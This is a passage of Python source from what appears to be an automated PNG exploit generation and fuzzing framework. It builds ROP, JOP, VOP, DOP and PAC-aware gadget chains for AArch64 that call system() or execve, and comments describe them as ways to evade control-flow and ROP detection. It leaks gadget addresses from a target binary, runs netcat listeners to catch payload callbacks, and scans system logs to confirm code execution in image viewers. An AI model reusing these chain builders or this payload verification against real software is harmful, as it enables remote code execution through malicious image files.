        b"\x00" * 8 +                          # x2 = NULL
        function_addr.to_bytes(8, 'little')     # call system or execve
    )
    
    if leaks.get("system"):
        logger.info("Generated standard ROP chain targeting system()")
    else:
        logger.info("Generated standard ROP chain targeting execve() (fallback)")
    return rop_chain


def compile_jop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
                      leaks: Optional[Dict] = None, chain_base_addr: Optional[int] = None) -> bytes:
    """Compile a JOP (Jump Oriented Programming) chain.
    
    Args:
        arch: Target architecture ('aarch64' or 'x86_64').
        gadgets: List of available gadgets (from lookup_gadgets).
        payload_addr: Memory address of the payload to execute.
        leaks: Optional dictionary of leaked function/gadget addresses.
        chain_base_addr: Optional base address for the JOP chain.
    
    Returns:
        Binary JOP chain as bytes, or empty bytes if chain cannot be compiled.
    """
    """
    Compiles a JOP (Jump Oriented Programming) chain.
    
    JOP chains use a dispatcher gadget that reads addresses from a data table
    and branches to them sequentially. This is more ROP-resistant than traditional ROP.
    
    For AArch64 without complex dispatcher gadgets, we'll use a simplified approach:
    Load payload address and call system via indirect branch.
    """
    if arch != "aarch64":
        logger.warning(f"JOP chain compilation for {arch} not implemented")
        return b""
    
    leaks = leaks or {}
    payload_address = payload_addr
    function_addr = leaks.get("system", 0) or leaks.get("execve", 0)

    if not function_addr:
        logger.warning("Neither system nor execve address available in leaks, cannot compile JOP chain")
        return b""

    # Find available JOP gadgets
    mov_x0_x1_br_x0 = leaks.get("gadget_mov_x0_x1_br_x0", 0)
    ldr_x0_x1_br_x0 = leaks.get("gadget_ldr_x0_x1_br_x0", 0)

    # Fallback names for similarly named gadgets
    if not mov_x0_x1_br_x0:
        mov_x0_x1_br_x0 = leaks.get("mov_x0_x1_br_x0", 0) or leaks.get("gadget_mov_x1_x0_br_x1", 0)
        if mov_x0_x1_br_x0:
            logger.info("Using fallback JOP gadget name for mov_x0_x1_br_x0")

    if not ldr_x0_x1_br_x0:
        ldr_x0_x1_br_x0 = leaks.get("ldr_x0_x1_br_x0", 0) or leaks.get("gadget_ldr_x1_x0_br_x1", 0)
        if ldr_x0_x1_br_x0:
            logger.info("Using fallback JOP gadget name for ldr_x0_x1_br_x0")
    
    jop_chain = b""
    
    if mov_x0_x1_br_x0:
        pop_x0_x1 = leaks.get("pop_x0_x1_ret", 0)
        if pop_x0_x1:
            jop_chain = (
                pop_x0_x1.to_bytes(8, 'little') +
                b"\x00" * 8 +                    # x0 = NULL (not used)
                function_addr.to_bytes(8, 'little') +  # x1 = system/execve
                mov_x0_x1_br_x0.to_bytes(8, 'little')  # mov x0, x1; br x0 -> call fcn
            )
            logger.info(f"Generated simplified JOP chain (mov x0, x1; br x0) targeting {'system' if leaks.get('system') else 'execve'}")
    elif ldr_x0_x1_br_x0:
        pop_x0_x1 = leaks.get("pop_x0_x1_ret", 0)
        if pop_x0_x1:
            jop_chain = (
                pop_x0_x1.to_bytes(8, 'little') +
                b"\x00" * 8 +                    # x0 = NULL (not used)
                function_addr.to_bytes(8, 'little') +  # x1 = system/execve
                ldr_x0_x1_br_x0.to_bytes(8, 'little')  # ldr x0,[x1]; br x0 -> call fcn
            )
            logger.info(f"Generated simplified JOP chain (ldr x0,[x1]; br x0) targeting {'system' if leaks.get('system') else 'execve'}")
    else:
        logger.warning("Required JOP gadgets not found in leaks")
        return b""
    
    return jop_chain

def compile_vop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
                      leaks: Optional[Dict] = None, chain_base_addr: Optional[int] = None,
                      pac_enabled: bool = False) -> bytes:
    """Compile a VOP (Vector-Oriented Programming) chain for AArch64.
    
    Args:
        arch: Target architecture ('aarch64' or 'x86_64').
        gadgets: List of available gadgets (from lookup_gadgets).
        payload_addr: Memory address of the payload to execute.
        leaks: Optional dictionary of leaked function/gadget addresses.
        chain_base_addr: Optional base address for the VOP chain.
        pac_enabled: Whether Pointer Authentication is enabled.
    
    Returns:
        Binary VOP chain as bytes, or empty bytes if chain cannot be compiled.
    """
    """
    Compiles a VOP (Vector-Oriented Programming) chain for AArch64.
    
    VOP uses NEON/AdvSIMD 128-bit (q0-q31) and 64-bit (d0-d31) vector registers
    to evade standard ROP/JOP detection and move large amounts of data silently.
    
    VOP Chain Strategy:
    1. Load data into q0 register via LDR Q0, [x1]
    2. Perform FMOV operations to move data through floating-point registers
    3. Store data via STR Q0, [x0] or FMOV d0, x1; STR d0, [x0]
    
    Advantages:
    - Evades integer register ROP detection
    - Can transfer 128-bit chunks in single instruction
    - Natural for metadata/buffer operations in PNG parsing
    """
    if arch != "aarch64":
        logger.warning(f"VOP chain only supported on AArch64, got {arch}")
        return b""
    
    leaks = leaks or {}
    payload_address = payload_addr
    function_addr = leaks.get("system", 0) or leaks.get("execve", 0)
    
    # VOP Gadget addresses
    vop_fmov_str_gadget = leaks.get("gadget_vop_fmov", 0)  # FMOV d0, x1; STR d0, [x0]; RET
    vop_ldr_str_q0_gadget = leaks.get("gadget_vop_ldr_str_q0", 0)  # LDR Q0, [x1]; STR Q0, [x0]; RET
    ldr_x0_x1_br_x0 = leaks.get("gadget_ldr_x0_x1_br_x0", 0)  # Load and branch
    
    if not (vop_fmov_str_gadget or vop_ldr_str_q0_gadget):
        logger.warning("VOP gadgets not found in leaks. Falling back to ROP/JOP.")
        return b""
    
    if not function_addr:
        logger.warning("Neither system nor execve available for VOP chain jump target")
        return b""
    
    vop_chain = b""
    
    # Stage 1: Load payload via vector registers (128-bit copy via Q0)
    if vop_ldr_str_q0_gadget and payload_address and function_addr:
        logger.info("VOP Stage 1: Loading payload via 128-bit vector register Q0")
        
        # Prepare x0 and x1 for the gadget:
        # x0 = destination buffer (system address or stack)
        # x1 = source buffer (payload address)
        pop_x0_x1_x2 = leaks.get("pop_x0_x1_x2_ret", 0)
        
        if pop_x0_x1_x2:
            vop_chain += pop_x0_x1_x2.to_bytes(8, 'little')
            vop_chain += function_addr.to_bytes(8, 'little')  # x0 = function target (system/execve)
            vop_chain += payload_address.to_bytes(8, 'little')  # x1 = payload (source)
            vop_chain += b"\x00" * 8  # x2 padding
            
            # Execute VOP gadget: LDR Q0, [x1]; STR Q0, [x0]; RET
            vop_chain += vop_ldr_str_q0_gadget.to_bytes(8, 'little')
            logger.info("VOP: Queued LDR Q0, [payload]; STR Q0, [function target buffer]")
    
    # Stage 2: Alternative - using 64-bit FMOV for precision control
    if vop_fmov_str_gadget and payload_address:
        logger.info("VOP Stage 2: High-precision data movement via 64-bit FMOV")
        
        # FMOV moves data from x-register to d-register (64-bit floating point)
        # This is useful for moving function pointers or addresses
        # x1 = value to move (typically address or function target)
        # [x0] = destination for the moved value
        
        pop_x0_x1 = leaks.get("pop_x0_x1_ret", 0)
        if pop_x0_x1:
            vop_chain += pop_x0_x1.to_bytes(8, 'little')
            vop_chain += function_addr.to_bytes(8, 'little')  # x0 = destination
            vop_chain += function_addr.to_bytes(8, 'little')  # x1 = value (system/execve address)
            
            # Execute FMOV gadget: FMOV d0, x1; STR d0, [x0]; RET
            vop_chain += vop_fmov_str_gadget.to_bytes(8, 'little')
            logger.info("VOP: Queued FMOV d0, function target; STR d0, [function target buffer]")
    
    # Stage 3: Final control flow via vector-aware branch
    # After VOP operations, return to normal program flow or trigger system()
    if ldr_x0_x1_br_x0:
        # Final gadget to load and branch to system()
        vop_chain += ldr_x0_x1_br_x0.to_bytes(8, 'little')
        vop_chain += payload_address.to_bytes(8, 'little')
        logger.info("VOP Stage 3: Return to standard execution via LDR X0, [payload]; BR X0")
    
    if vop_chain:
        logger.info(f"Generated VOP chain ({len(vop_chain)} bytes) with 128-bit vector operations")
    else:
        logger.warning("Failed to generate VOP chain")
    
    return vop_chain


def compile_dop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
                      leaks: Optional[Dict] = None, chain_base_addr: Optional[int] = None) -> bytes:
    """Compile a DOP (Data-Oriented Programming) chain using VOP gadgets.
    
    Args:
        arch: Target architecture ('aarch64' or 'x86_64').
        gadgets: List of available gadgets (from lookup_gadgets).
        payload_addr: Memory address of the payload to execute.
        leaks: Optional dictionary of leaked function/gadget addresses.
        chain_base_addr: Optional base address for the DOP chain.
    
    Returns:
        Binary DOP chain as bytes, or empty bytes if chain cannot be compiled.
    """
    """
    Compiles a DOP (Data-Oriented Programming) chain using VOP gadgets.
    
    DOP focuses on data flow manipulation rather than control flow.
    Uses VOP gadgets to move data between memory locations, bypassing
    traditional ROP/JOP detection that monitors x0-x30 registers.
    
    DOP Chain Strategy:
    1. Chain multiple LDR Q0 / STR Q0 gadgets to copy payloads
    2. Use FMOV to move critical data (pointers, addresses) through d-registers
    3. Maintain data flow without triggering integer register monitors
    """
    if arch != "aarch64":
        return b""
    
    leaks = leaks or {}
    
    # VOP gadgets for DOP
    vop_ldr_str_q0 = leaks.get("gadget_vop_ldr_str_q0", 0)  # 128-bit memory-to-memory
    vop_fmov_str = leaks.get("gadget_vop_fmov", 0)  # 64-bit precision movement
    
    if not (vop_ldr_str_q0 or vop_fmov_str):
        logger.warning("DOP gadgets (VOP) not available")
        return b""
    
    dop_chain = b""
    function_addr = leaks.get("system", 0) or leaks.get("execve", 0)
    payload_addr_val = leaks.get("payload", 0)
    
    if not function_addr:
        logger.warning("Neither system nor execve available for DOP chain data redirection")
        return b""
    
    # DOP Stage 1: Setup (copy input data to work buffer via 128-bit chunks)
    if vop_ldr_str_q0:
        pop_x0_x1_x2 = leaks.get("pop_x0_x1_x2_ret", 0)
        
        if pop_x0_x1_x2:
            # First copy: Load input data
            dop_chain += pop_x0_x1_x2.to_bytes(8, 'little')
            dop_chain += (function_addr + 0x100).to_bytes(8, 'little')  # x0 = work buffer
            dop_chain += payload_addr_val.to_bytes(8, 'little')  # x1 = payload
            dop_chain += b"\x00" * 8  # x2 padding
            dop_chain += vop_ldr_str_q0.to_bytes(8, 'little')
            
            logger.info("DOP Stage 1: Copied 128-bit payload chunk to work buffer")
    
    # DOP Stage 2: Process (move data through floating-point for evasion)
    if vop_fmov_str:
        pop_x0_x1 = leaks.get("pop_x0_x1_ret", 0)
        
        if pop_x0_x1:
            dop_chain += pop_x0_x1.to_bytes(8, 'little')
            dop_chain += (function_addr + 0x200).to_bytes(8, 'little')  # x0 = output buffer
            dop_chain += function_addr.to_bytes(8, 'little')  # x1 = system/execve address
            dop_chain += vop_fmov_str.to_bytes(8, 'little')
            
            logger.info("DOP Stage 2: Moved critical data through d0 register (evades x-register monitors)")
    
    if dop_chain:
        logger.info(f"Generated DOP chain ({len(dop_chain)} bytes) with data-flow manipulation")
    
    return dop_chain


def compile_pac_dop_chain(arch: str, gadgets: List[Dict], payload_addr: int,
                         leaks: Dict = None, chain_base_addr: Optional[int] = None,
                         pac_enabled: bool = True) -> bytes:
    """
    Compiles a PAC-aware DOP chain for AArch64.

    PAC_DOP uses data-oriented programming gadgets with pointer authentication
    helpers when available, improving success against strong CFI/BTI defenses.
    """
    if arch != "aarch64":
        logger.warning(f"PAC_DOP chain only supported on AArch64, got {arch}")
        return b""

    leaks = leaks or {}
    if not pac_enabled or not leaks.get("pac_enabled", False):
        logger.info("PAC not enabled; falling back to standard DOP chain")
        return compile_dop_chain(arch, gadgets, payload_addr, leaks, chain_base_addr)

    paciasp = leaks.get("gadget_paciasp", 0) or leaks.get("paciasp", 0)
    autiasp = leaks.get("gadget_autiasp", 0) or leaks.get("autiasp", 0)
    dop_chain = compile_dop_chain(arch, gadgets, payload_addr, leaks, chain_base_addr)

    if not dop_chain:
        return b""

    pac_dop_chain = b""
    if paciasp:
        logger.info("Adding PACIASP prologue to PAC_DOP chain")
        pac_dop_chain += paciasp.to_bytes(8, 'little')
        pac_dop_chain += b"\x00" * 8
    if autiasp:
        logger.info("Adding AUTIASP finishing gadget to PAC_DOP chain")
        pac_dop_chain += autiasp.to_bytes(8, 'little')

    pac_dop_chain += dop_chain
    if pac_dop_chain:
        logger.info(f"Generated PAC_DOP chain ({len(pac_dop_chain)} bytes)")
    return pac_dop_chain


def _extract_gadget_address(output: str, key: str) -> Optional[int]:
    """Extract a gadget address from process output using several tolerant patterns."""
    patterns = [
        rf"\bGadget\s*{re.escape(key)}\s*[:=]\s*(0x[0-9a-fA-F]+)",
        rf"\b{re.escape(key)}\s*[:=]\s*(0x[0-9a-fA-F]+)",
        rf"\b{re.escape(key)}\s+Address\s*[:=]\s*(0x[0-9a-fA-F]+)",
        rf"\b{re.escape(key)}\b.*?\b(0x[0-9a-fA-F]{{8,16}})\b",
    ]
    for patt in patterns:
        m = re.search(patt, output, re.IGNORECASE)
        if m:
            try:
                return int(m.group(1), 16)
            except (ValueError, IndexError):
                continue
    return None


def leak_addresses() -> Dict[str, int]:
    """Runs the consumer on a base PNG to leak internal addresses."""
    # Create a temporary directory for leak data to avoid cluttering CWD
    leak_dir = "leak_data_tmp"
    os.makedirs(leak_dir, exist_ok=True)
    base_file = os.path.join(leak_dir, "base_leak.png")
    
    # Ensure generate_base_png is called with an absolute path
    generate_base_png(os.path.abspath(base_file))
    import subprocess
    addresses = {}
    try:
        png_consumer_abs_path = ensure_png_consumer_built()
        
        # Run with ASLR disabled for stable addresses during validation
        #proc = subprocess.run(["setarch", platform.machine(), "-R", png_consumer_abs_path], capture_output=True, text=True, timeout=2, cwd=leak_dir) # Run without arguments to get gadget addresses
        #without setarch to ensure it works on all platforms, even if ASLR is enabled (addresses will be randomized but we can still extract gadgets) 
        proc = subprocess.run([png_consumer_abs_path, base_file], capture_output=True, text=True, timeout=10, cwd=leak_dir) # Run without arguments to get gadget addresses 

        output = proc.stdout

        keys_to_check = [
            "mprotect", "system", "payload",
            "pop_x0_x1_x2_ret", "ldp_x29_x30", "pop_x0_x1_x2_x30_br_x0", "jump_x0",
            "load_mprotect_x3", "load_payload_x0", "br_x3",
            "ldr_x0_x1_br_x0", "mov_x0_x1_br_x0", "ldr_x1_x0_br_x1", "mov_x1_x0_br_x1",
            "pop_x0_x1_ret", "pop_x0_ret", "pop_x1_ret", "ldr_x0_sp_br_x0", "ldr_x1_sp_br_x1",
            "ldr_str_x0_x1", "ldr_str_x1_x0", "memcpy_64", "memcpy_128",
            "gadget_vop_fmov", "gadget_vop_ldr_str_q0", "vop_ldr_str_d0", "vop_fmov_x0_d0",
            "vop_fmov_d0_x1", "vop_dup_q0_x1", "vop_str_q0_sp", "vop_ldr_q0_sp"
        ]

        for key in keys_to_check:
            addr = _extract_gadget_address(output, key)
            if addr:
                addresses[key] = addr
            else:
                logger.debug(f"Gadget {key} not found in leak output")

        # extra conversion for old style names (if still needed)
        if "gadget_mov_x0_x1_br_x0" not in addresses and "mov_x0_x1_br_x0" in addresses:
            addresses["gadget_mov_x0_x1_br_x0"] = addresses["mov_x0_x1_br_x0"]
        if "gadget_ldr_x0_x1_br_x0" not in addresses and "ldr_x0_x1_br_x0" in addresses:
            addresses["gadget_ldr_x0_x1_br_x0"] = addresses["ldr_x0_x1_br_x0"]

    except Exception as e:
        logger.error(f"Error in leak_addresses: {e}")
        import traceback
        logger.error(traceback.format_exc())
    finally:
        if os.path.exists(base_file): os.remove(base_file)
        if os.path.exists(leak_dir): shutil.rmtree(leak_dir) # Clean up temp directory
    return addresses

def find_and_update_chunk_crc(content: bytearray, chunk_type_to_find: bytes) -> bytearray:
    """
    Finds a specific chunk in the PNG content, recalculates its CRC, and updates it.
    Assumes a single chunk of the specified type for simplicity.
    """
    # PNG signature is 8 bytes
    # Chunk structure: 4 bytes length, 4 bytes type, N bytes data, 4 bytes CRC
    
    offset = 8 # Start after PNG signature
    while offset < len(content):
        length = int.from_bytes(content[offset:offset+4], 'big')
        chunk_type = content[offset+4:offset+8]
        
        if chunk_type == chunk_type_to_find:
            chunk_data_start = offset + 8
            chunk_data_end = chunk_data_start + length
            chunk_data = content[chunk_data_start:chunk_data_end]
            
            new_crc = calculate_png_crc(chunk_type, chunk_data)
            
            # Update the CRC in the content bytearray
            content[chunk_data_end:chunk_data_end+4] = new_crc
            return content # Return updated content and exit
        
        # Move to the next chunk
        offset += 4 + 4 + length + 4  # Length + Type + Data + CRC
    
    return content # Return original content if chunk not found


def cleanup_defunct_processes():
    """Clean up defunct listener/viewer processes to prevent accumulation."""
    try:
        import psutil
        current_process = psutil.Process()
        children = current_process.children(recursive=True)
        
        for child in children:
            try:
                child_name = child.name().lower()
                if any(token in child_name for token in ['nc', 'netcat', 'png_consumer']):
                    if child.status() == psutil.STATUS_ZOMBIE:
                        logger.info(f"Cleaning up defunct process {child.pid} ({child_name})")
                        child.wait()  # Reap the zombie
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
    except ImportError:
        # psutil not available, try basic approach
        try:
            result = subprocess.run(['pgrep', '-f', 'nc.*-l.*-k'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                pids = result.stdout.strip().split('\n')
                for pid in pids:
                    try:
                        # Check if process is defunct
                        with open(f'/proc/{pid}/stat', 'r') as f:
                            stat = f.read()
                            if '<defunct>' in stat:
                                logger.info(f"Found defunct netcat process {pid}, attempting cleanup")
                                subprocess.run(['kill', '-9', pid], timeout=2)
                    except:
                        pass
        except:
            pass
    except Exception as e:
        logger.debug(f"Error during defunct process cleanup: {e}")


def start_netcat_listener(port: int = 24444, log_dir: str = os.path.join("logs", "files", "netcat"), use_async: bool = True) -> Tuple[Union[subprocess.Popen, AsyncServerProcess], str, object]: 
    """
    Starts a payload listener server before fuzzing.
    
    By default, uses an efficient async server with low IPC overhead.
    Falls back to netcat if async server fails or if use_async=False.
    
    Keeps the listener alive across connections and writes logs to log_dir.
    Returns (server_process, log_file_path, file_handle).
    
    Args:
        port: Port to listen on (default 24444).
        log_dir: Directory for logs (default logs/files/netcat for backward compatibility).
        use_async: Use async server (True) or netcat fallback (False).
    """
    try:
        if not os.path.isabs(log_dir):
            log_dir = os.path.join(ROOT_DIR, log_dir)
        log_dir = os.path.abspath(log_dir)
        os.makedirs(log_dir, exist_ok=True)
        nc_output_file = os.path.join(log_dir, f"netcat_{int(time.time())}.log")
        
        # Try async server first (default)
        if use_async:
            try:
                logger.info(f"Attempting to start async payload server on port {port}")
                # Create empty log file
                with open(nc_output_file, 'w') as f:
                    f.write(f"[{time.time()}] Async payload server started\n")
                
                # Create and start async server wrapper
                async_proc = AsyncServerProcess(port=port, log_file=nc_output_file)
                async_proc.start()
                
                # Verify server is running
                time.sleep(0.2)
                if async_proc.poll() is not None:
                    raise RuntimeError("Async server failed to start")
                
                # Open log file handle for compatibility
                log_f = open(nc_output_file, 'a')
                logger.info(f"✓ Async payload server started successfully on port {port}; logging to {nc_output_file}")
                return async_proc, nc_output_file, log_f
            
            except Exception as e:
                logger.warning(f"Async server startup failed ({type(e).__name__}: {e}), falling back to netcat listener")
                # Fall through to netcat fallback
        
        # Fallback to netcat
        logger.info(f"Starting netcat listener on port {port}")
        
        # Open log file for appending
        
        log_f = open(nc_output_file, 'w')
        
        # Try ncat first (better timeout support), fall back to nc
        ncat_executable = shutil.which("ncat")
        nc_executable = shutil.which("nc") or shutil.which("netcat")
        
        if ncat_executable:
            # ncat has per-connection timeout: -w sets read timeout
            nc_cmd = [ncat_executable, "-l", "-k", "-v", "-p", str(port), "-w", "2"]
            logger.info(f"Using ncat with 2-second per-connection timeout on port {port}")
        elif nc_executable:
            # Use nc with timeout wrapper: timeout command kills connection after read
            nc_cmd = [nc_executable, "-l", "-k", "-v", "-p", str(port)]
            logger.info(f"Using nc (netcat) on port {port}")
        else:
            log_f.close()
            raise FileNotFoundError("Neither ncat nor nc found in PATH; unable to start listener")
        
        # Set up environment to prevent buffering issues
        env = os.environ.copy()
        env['PYTHONUNBUFFERED'] = '1'
        
        nc_process = subprocess.Popen(
            nc_cmd,
            stdout=log_f,
            stderr=subprocess.STDOUT,
            env=env,
            text=True,
            bufsize=1,  # Line-buffered output 
        )
        log_f.close()
        # Give process a moment to start
        time.sleep(0.2)
        
        # Verify process started successfully
        if nc_process.poll() is not None:
            raise RuntimeError(f"Netcat process exited immediately with code {nc_process.returncode}")
        
        logger.info(f"Started netcat listener on port {port}; logging to {nc_output_file}")
        
        return nc_process, nc_output_file, log_f
    
    except Exception as e:
        logger.error(f"Failed to start payload listener: {e}")
        raise e
    finally:
        # Ensure log file is closed if it was opened
        try:
            if 'log_f' in locals() and not log_f.closed:
                log_f.close()
        except Exception:
            pass

    

def verify_netcat_connection(nc_process: Union[subprocess.Popen, AsyncServerProcess], timeout: int = 5) -> bool:
    """
    Verifies if listener detected a connection by checking process output.
    Works with both async server and netcat processes.
    """ 
    if not nc_process:
        return False
    
    # For async server, check if it's running
    if isinstance(nc_process, AsyncServerProcess):
        return nc_process.poll() is None
    
    # For netcat, check process output
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            # Check if process is still running
            if nc_process.poll() is not None:
                # Process finished, get output if available
                if hasattr(nc_process, 'communicate'):
                    try:
                        stdout, _ = nc_process.communicate(timeout=1)
                        if stdout:
                            logger.debug(f"Netcat output: {stdout}")
                            # Check for connection indicators
                            if any(keyword in str(stdout).lower() for keyword in ["connect", "connection", "accepted", "session"]):
                                logger.info("Netcat detected connection!")
                                return True
                    except:
                        pass
                return False
            
            # Process still running, wait a bit
            time.sleep(0.2)
        except Exception as e:
            logger.debug(f"Error checking listener: {e}")
            return False
    
    return False

MAX_OPEN_FILES = 100000 # Arbitrary high limit to prevent resource exhaustion during fuzzing
def ensure_netcat_listener_state(fuzzer_instance) -> Tuple[Union[subprocess.Popen, AsyncServerProcess], str, object]:
    """Ensure payload listener (async or netcat) exists and is running before fuzzing."""
    import psutil
    
    # Clean up any defunct processes first
    cleanup_defunct_processes()
    
    # Check if existing process is still alive and not defunct
    if getattr(fuzzer_instance, 'netcat_process', None):
        listener = fuzzer_instance.netcat_process
        
        # Check poll status
        if listener.poll() is None:
            # Process is still running, check if it's not defunct (skip for async)
            if isinstance(listener, AsyncServerProcess):
                return listener, fuzzer_instance.netcat_output_file, getattr(fuzzer_instance, 'netcat_log_f', None)
            
            try:
                proc = psutil.Process(listener.pid)
                if proc.status() != psutil.STATUS_ZOMBIE:
                    return listener, fuzzer_instance.netcat_output_file, getattr(fuzzer_instance, 'netcat_log_f', None)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        else:
            # Process has exited, try to clean up
            try:
                listener.wait(timeout=1)
            except (subprocess.TimeoutExpired, AttributeError):
                try:
                    listener.kill()
                except:
                    pass
    
    # Start new listener
    nc_process, nc_output_file, log_f = start_netcat_listener()
    fuzzer_instance.netcat_process = nc_process
    fuzzer_instance.netcat_output_file = nc_output_file
    fuzzer_instance.netcat_log_f = log_f
    return nc_process, nc_output_file, log_f
#globals for tracking file states across checks in verify_payload_execution
files_states = {}  # filepath -> (size, mtime, last_check_time)
file_states_lock = threading.Lock()  # To synchronize access to file_states 
# ────────────────────────────────────────────────────────────────────────────────
# New helper functions for fast indicator gathering
# ────────────────────────────────────────────────────────────────────────────────


def _search_netcat_unique_id(unique_id: str, log_dir: str = "./logs/files/netcat") -> bool:
    """
    Search only the most recent netcat log file for *unique_id*.
    Uses _read_new_lines() to avoid re‑reading the whole file.
    """
    if not os.path.isdir(log_dir):
        return False

    candidates = sorted(
        [os.path.join(log_dir, f) for f in os.listdir(log_dir)
         if f.startswith("netcat_") and f.endswith(".log")],
        key=os.path.getmtime,
    )
    if not candidates:
        return False

    # Only inspect the newest log file
    file_path = candidates[-1]
    for line in _read_new_lines(file_path):
        if unique_id in line:
            logger.debug(f"Found unique_id in netcat log {file_path}")
            return True
    return False

def _search_syslog_unique_id(unique_id: str) -> bool:
    """
    Search journalctl first; if that fails, use /var/log/syslog and /var/log/kern.log.
    In the fallback case we read only the data that has been appended since the last call.
    """
    # Prefer journalctl – it already gives us the “new” entries.
    try:
        result = subprocess.run(
            ["journalctl", "--since", "1 minute ago", "--grep", unique_id],
            capture_output=True, text=True, timeout=5, check=False
        )
        if result.returncode == 0 and unique_id in result.stdout:
            logger.debug("Found unique_id via journalctl")
            return True
    except Exception as exc:
        logger.debug(f"journalctl failed: {exc}")

    # Fallback: read syslog/kern.log incrementally.
    for log_path in ("/var/log/syslog", "/var/log/kern.log"):
        if not os.path.exists(log_path):
            continue
        for line in _read_new_lines(log_path):
            if unique_id in line:
                logger.debug(f"Found unique_id in syslog {log_path}")
                return True
    return False


def find_unique_in_netcat(unique_id: str, log_dir: str = "./logs/files/netcat") -> bool:
    """
    Check the most recent netcat log file for the unique_id.
    Returns True as soon as the ID is found.
    """
    if not os.path.isdir(log_dir):
        return False

    # Pick the newest log file
    candidates = sorted(
        [os.path.join(log_dir, f) for f in os.listdir(log_dir) if f.startswith("netcat_") and f.endswith(".log")],
        key=os.path.getmtime,
    )
    if not candidates:
        return False

    # Only read the last file
    file_path = candidates[-1]
    try:
        with open(file_path, "r", errors="ignore") as f:
            for line in f:
                if unique_id in line:
                    logger.debug(f"Found unique_id in netcat log {file_path}")
                    return True
    except Exception as e:
        logger.warning(f"Failed to read netcat log {file_path}: {e}")
    return False


def find_unique_in_syslog(unique_id: str) -> bool:
    """
    Search system logs using journalctl (or grep fallback) for the unique_id.
    Returns True if found.
    """
    # Prefer journalctl for reliability
    try:
        cmd = ["journalctl", "--since", "1 minute ago", "--grep", unique_id]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5, check=False)
        if result.returncode == 0 and unique_id in result.stdout:
            logger.debug("Found unique_id in journalctl output")
            return True
    except Exception as e:
        logger.debug(f"journalctl failed: {e}")

    # Fallback to grep over syslog files
    for log_path in ("/var/log/syslog", "/var/log/kern.log"):
        if not os.path.exists(log_path):
            continue
        try:
            with open(log_path, "r", errors="ignore") as f:
                for line in f:
                    if unique_id in line:
                        logger.debug(f"Found unique_id in syslog {log_path}")
                        return True
        except Exception as e:
            logger.debug(f"Failed to read syslog {log_path}: {e}")
    return False


LAST_OFFSETS: Dict[str, int] = {}
def _is_readable_log(file_path: str) -> bool:
    """
    Return True only if the file exists, is a regular file, and we have read permission.
    Skip files that are known to be privileged or extremely large.
    """
    privileged = (
        "boot.log",
        "wtmp",
        "utmp",
        "lastlog",
        "last",
        "auth.log",
        "secure",
        "kern.log",
    )
    if not os.path.isfile(file_path):
        return False
    if any(p in os.path.basename(file_path).lower() for p in privileged):
        return False
    try:
        # Try opening for reading; this will raise PermissionError if we cannot.
        with open(file_path, "rb"):
            pass
    except PermissionError:
        return False
    except Exception:
        # Any other error – we ignore the file.
        return False
    return True
def _read_new_lines(file_path: str) -> Iterator[str]:
    """
    Yield only the lines that have been appended to *file_path* since the last
    time this function was called for that file.  The function remembers the
    last read offset in the global LAST_OFFSETS dictionary.
    """
    if not _is_readable_log(file_path):
        return  # skip unreadable/privileged file

    start = LAST_OFFSETS.get(file_path, 0)
    try:
        with open(file_path, "rb") as f:
            f.seek(start)
            data = f.read()
            LAST_OFFSETS[file_path] = f.tell()
    except Exception:
        return

    for line in data.decode(errors="ignore").splitlines():
        yield line
def _read_new_lines(file_path: str) -> Iterator[str]:
    """
    Yield only the lines that have been appended to *file_path* since the last
    time this function was called for that file.  The function remembers the
    last read offset in the global LAST_OFFSETS dictionary.
    """
    if not _is_readable_log(file_path):
        return  # skip unreadable/privileged file

    start = LAST_OFFSETS.get(file_path, 0)
    try:
        with open(file_path, "rb") as f:
            f.seek(start)
            data = f.read()
            LAST_OFFSETS[file_path] = f.tell()
    except Exception:
        return

    for line in data.decode(errors="ignore").splitlines():
        yield line
def verify_payload_execution(
    unique_id: str,
    viewer_name: str,
    payload: str,
    timeout: int = 5,
    nc_process: subprocess.Popen = None,
    nc_output_file: str = None,
    viewer_process: subprocess.Popen = None,
) -> bool:
    """
    Verify payload execution by analyzing the following indicators:

        1. Net‑cat listener logs (only the newest file).
        2. System logs via journalctl or incremental syslog scanning.
        3. Small, readable log files that might contain the trigger.
           (e.g. /tmp, /var/log/daemon.log, etc.)

    The function returns *True* as soon as the unique_id is found in any of the
    sources.  It never re‑reads data that has already been processed.
    """
    logger.info(f"Verifying payload execution for {viewer_name} with unique_id: {unique_id}")

    # 1. Net‑cat check
    if _search_netcat_unique_id(unique_id):
        logger.info("Payload execution confirmed via netcat log")
        return True

    # 2. System‑log / journalctl check
    if _search_syslog_unique_id(unique_id):
        logger.info("Payload execution confirmed via system logs")
        return True

    # 3. Small‑file fallback (only 200 kB per file, read incrementally)
    candidate_dirs = (
        "./logs/files/netcat",
        "./logs/files",
        "/tmp",
        "/var/log",
    )
    for d in candidate_dirs:
        if not os.path.isdir(d):
            continue
        try:
            for entry in os.scandir(d):
                if not entry.is_file():
                    continue
                # Skip huge files – we only care about small log snippets
                if os.path.getsize(entry.path) > 200_000:
                    continue
                for line in _read_new_lines(entry.path):
                    if unique_id in line:
                        logger.info(f"Payload execution confirmed in {entry.path}")
                        return True
        except Exception as exc:
            logger.debug(f"Scanning directory {d} failed: {exc}")

    # 4. If we reach here the unique_id was not found.
    logger.warning(f"Payload execution NOT CONFIRMED: '{unique_id}' not found within timeout {timeout}s")
    return False

def log_validated_payload_to_tensorboard(writer: SummaryWriter, image_path: str, viewer_name: str, fuzz_type: str, step: int):
    """
    Logs a validated payload image and its details to TensorBoard.
    """
    try:
        # Load image
        img = Image.open(image_path)
        # Convert to tensor
        to_tensor = transforms.ToTensor()
        img_tensor = to_tensor(img)
        
        # Log image
        caption = f"Viewer: {viewer_name}, Fuzz Type: {fuzz_type}"
        writer.add_image(f"Validated Payload/{viewer_name}/{fuzz_type}", img_tensor, global_step=step, dataformats='CHW')
        writer.add_text(f"Validated Payload Details/{viewer_name}/{fuzz_type}", caption, global_step=step)
        logger.info(f"Logged validated payload to TensorBoard: {image_path} for {viewer_name}/{fuzz_type}")
    except Exception as e:
        logger.error(f"Error logging validated payload to TensorBoard for {image_path}: {e}")

def save_trajectory_database(results: List[Dict], output_dir: str):
    """
